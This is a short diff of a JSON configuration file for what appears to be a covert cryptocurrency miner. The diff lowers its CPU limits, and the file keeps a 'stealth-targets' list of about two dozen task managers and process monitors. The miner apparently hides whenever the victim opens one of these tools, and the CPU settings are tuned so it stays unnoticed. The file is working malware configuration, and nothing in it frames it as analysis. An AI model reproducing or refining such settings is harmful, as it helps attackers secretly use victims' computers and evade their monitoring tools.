@@ -6,9 +6,9 @@
     "password": "soch",
     "nicehash": false,
     "ssltls": false,
-    "max-cpu": 50,
+    "max-cpu": 40,
     "idle-wait": 3,
-    "idle-cpu": 70,
+    "idle-cpu": 50,
     "stealth-targets": "Taskmgr.exe,ProTaskmgr.exe,ProcessHacker.exe,resmon.exe,perfmon.exe,procexp.exe,procexp64.exe,Procmon.exe,Procmon64.exe,Procmon64a.exe,ProcessExplorer.exe,ProcessMonitor.exe,Autoruns.exe,ProcessLasso.exe,Depends.exe,HWMonitor.exe,SystemExplorer.exe,AnVirTaskManager.exe,ProcessActivityView.exe,ProcessHacker2.exe,AdvancedTaskManager.exe,ProcessMaster.exe,SecurityTaskManager.exe,WhatsRunning.exe,System Informer.exe",
     "kill-targets": "",
     "stealth-fullscreen": true
